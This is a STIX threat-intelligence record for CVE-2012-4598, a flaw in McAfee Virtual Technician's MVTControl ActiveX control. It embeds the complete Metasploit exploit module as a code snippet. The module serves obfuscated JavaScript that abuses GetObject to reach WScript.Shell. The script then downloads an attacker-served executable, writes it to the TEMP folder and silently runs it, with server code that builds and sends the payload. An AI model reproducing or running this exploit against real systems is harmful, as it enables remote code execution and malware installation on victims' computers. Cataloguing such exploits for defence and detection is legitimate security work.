{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ad57cde-70ed-4183-9ad7-e4942156094f",
    "created": "2024-08-14T16:44:56.488973Z",
    "modified": "2024-08-14T16:44:56.488977Z",
    "name": "\"McAfee Virtual Technician MVTControl 6.3.0.1911 GetObject Vulnerability\"",
    "description": " This module exploits a vulnerability found in McAfee Virtual Technician's MVTControl.  This ActiveX control can be abused by using the GetObject() function to load additional unsafe classes such as WScript.Shell, therefore allowing remote code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mcafee_mvt_exec.rb",
            "external_id": "mcafee_mvt_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4598"
        },
        {
            "source_name": "reference",
            "url": "https://kc.mcafee.com/corporate/index?page=content&id=SB10028"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"McAfee Virtual Technician MVTControl 6.3.0.1911 GetObject Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in McAfee Virtual Technician's\n        MVTControl.  This ActiveX control can be abused by using the GetObject() function\n        to load additional unsafe classes such as WScript.Shell, therefore allowing remote\n        code execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod',   #Initial discovery, Poc\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4598' ],\n          [ 'OSVDB', '81657'],\n          [ 'EDB', '18805' ],\n          [ 'URL', 'https://kc.mcafee.com/corporate/index?page=content&id=SB10028' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"none\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-30',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    @payload_name = rand_text_alpha(rand(6) + 5) + \".exe\"\n    super\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n\n    if agent !~ /MSIE \\d/\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    if request.uri =~ /\\.exe$/\n      return if ((p=regenerate_payload(cli))==nil)\n      data = generate_payload_exe({:code=>p.encoded})\n      print_status(\"Sending payload\")\n      send_response(cli, data, {'Content-Type'=>'application/octet-stream'})\n      return\n    end\n\n    # <object classid='clsid:2EBE1406-BE0E-44E6-AE10-247A0C5AEDCF' id='obj'></object>\n    js = <<-JS\n    var obj = new ActiveXObject(\"MVT.MVTControl.6300\");\n\n    var ws  = obj.GetObject(\"WScript.Shell\");\n    var ado = obj.GetObject(\"ADODB.Stream\");\n    var e   = ws.Environment(\"Process\");\n    var url = document.location + \"/#{@payload_name}\";\n    var tmp = e.Item(\"TEMP\") + \"\\\\\\\\#{@payload_name}\";\n\n    var xml = new ActiveXObject(\"Microsoft.XMLHTTP\");\n    xml.open(\"GET\", url, false);\n    xml.send(null);\n    res = xml.responseBody;\n\n    ado.Type = 1;\n    ado.Mode = 3;\n    ado.Open();\n    ado.Write(res);\n    ado.SaveToFile(tmp);\n    ws.Run(tmp, 0);\n    JS\n\n    js = ::Rex::Exploitation::JSObfu.new(js)\n    js.obfuscate(memory_sensitive: true)\n\n    html = <<-EOS\n    <html>\n    <head>\n    </head>\n    <body>\n    <script defer=defer>\n    #{js}\n    </script>\n    </body>\n    </html>\n    EOS\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-30",
    "x_mitre_platforms": [
        "win'"
    ]
}